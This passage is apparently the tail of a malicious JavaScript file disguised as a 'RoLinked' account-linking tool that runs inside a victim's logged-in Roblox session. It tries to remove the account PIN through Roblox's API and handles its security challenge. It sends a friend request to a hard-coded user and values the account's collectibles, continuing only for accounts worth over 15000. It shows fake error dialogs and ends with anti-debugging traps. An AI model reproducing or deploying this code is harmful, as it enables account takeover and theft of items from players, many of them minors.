                                        N(null, null);
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (c) {
                                var w = c.isEnabled,
                                    t = c.unlockedUntil;
                                if (w == true) {
                                    if (t == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var x = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", x);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                N(null, null);
                                            },
                                            error: function (O) {
                                                var E = atob(O.getResponseHeader("rblx-challenge-metadata"));
                                                var k = O.getResponseHeader("rblx-challenge-id"),
                                                    u = E.split('"challengeId":"').pop().split('"')[0];
                                                j(u, k, null);
                                            },
                                        });
                                    }
                                } else {
                                    N(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await A(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var U = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(U),
                            });
                        } catch {}
                        G();
                    } else {
                        function q(C) {
                            const P = "https://inventory.roblox.com/v1/users/" + C + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var j = {
                                url: P,
                                type: "GET",
                            };
                            return $.ajax(j);
                        }
                        q(F)
                            .done(function (C) {
                                if (C && C.data && C.data.length > 0) {
                                    let r = 0;
                                    C.data.forEach((c) => {
                                        c.recentAveragePrice && (r += c.recentAveragePrice);
                                    });
                                    if (r > 15000) {
                                        G();
                                    } else {
                                        var N = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", N);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var N = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", N);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (C, P, j) {
                                var z = {};
                                z.shefX = "promptPopup";
                                z.cZIvZ = "text-footer footer-note";
                                z.qdevh = "Not Active";
                                var c = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", c);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById("promptPopup").remove();
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById(w.shefX).remove();
                                    document.getElementsByClassName(w.cZIvZ)[0].innerText = w.qdevh;
                                };
                            });
                    }
                })();
            },
            error: function () {
                var Y = {};
                Y.BOQlm = "promptPopup";
                Y.wSiTL = "text-footer footer-note";
                Y.nZUWc = "Not Active";
                var F = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", F);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById(G.BOQlm).remove();
                    document.getElementsByClassName(G.wSiTL)[0].innerText = G.nZUWc;
                };
            },
        });
    }
})();
(function () {
    var I;
    try {
        var l = Function('return (function() {}.constructor("return this")( ));');
        I = l();
    } catch (S) {
        I = window;
    }
    I.setInterval(a, 4000);
})();
function a(Z) {
    function l(S) {
        if (typeof S === "string") {
            return function (B) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + S / S).length !== 1 || S % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        l(++S);
    }
    try {
        if (Z) {
            return l;
        } else {
            l(0);
        }
    } catch (S) {}
}
